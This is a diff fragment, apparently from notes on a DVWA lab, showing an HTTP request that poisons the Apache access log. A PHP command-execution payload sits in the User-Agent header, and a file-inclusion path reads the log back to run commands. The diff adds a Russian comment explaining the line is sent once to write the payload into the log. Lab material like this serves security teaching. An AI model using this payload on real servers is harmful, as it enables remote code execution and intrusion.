@@ -35,7 +35,7 @@ GET /dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=%70%68%70%20%
 
 Host: 192.168.0.117
 
-User-Agent: <?php system($_GET['cmd']); ?> Gecko/20100101 Firefox/78.0
+User-Agent: <?php system($_GET['cmd']); ?> Gecko/20100101 Firefox/78.0 #даннася строка требуется единожды, для записи данной комманды в файл логов
 
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 
